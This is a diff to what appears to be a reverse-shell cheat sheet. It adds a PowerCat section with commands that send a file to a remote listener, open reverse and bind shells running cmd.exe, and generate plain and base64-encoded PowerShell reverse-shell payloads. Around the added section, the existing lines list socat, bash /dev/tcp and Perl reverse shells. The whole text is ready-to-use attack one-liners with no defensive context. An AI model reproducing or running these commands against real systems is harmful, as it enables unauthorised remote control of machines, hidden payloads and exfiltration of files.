@@ -14,6 +14,15 @@ Socat Reverse Shell----socat TCP4:10.1.1.1:443 EXEC:/bin/bash
 Socat Encrypted Bind----socat OPENSSL-LISTEN:443,cert=priv.pem,verify=0,fork EXE C:/bin/bash
 Socat Connect to Encrypted Bind----socat - OPENSSL:10.1.1.1:443,verify=0
 
+##PowerCat
+Import----Import-Module ./powercat.ps1
+Send File to Remote Listener----powercat -c 10.1.1.11 -p 443 -i C:\tmp\file-to-transfer.ps1
+Bind to Local Application (reverse)----powercat -c 10.1.1.1 -p 443 -e cmd.exe
+Bind to Local Application (bind)----powercat -l -p 443 -e cmd.exe
+Generate PowerShell Rev Shell----powercat -c 10.1.1.1 -p 443 -e cmd.exe -g > reverseshell.ps1
+Generate Encoded PowerShell Rev Shell----####powercat -c 10.1.1.1 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1; powershell -E (Write-Host encodedreverseshell.ps1)
+
+
 Bash----bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 Bash----0<&196;exec 196<>/dev/tcp/<IP>/443; sh <&196 >&196 2>&196 
 Perl----perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
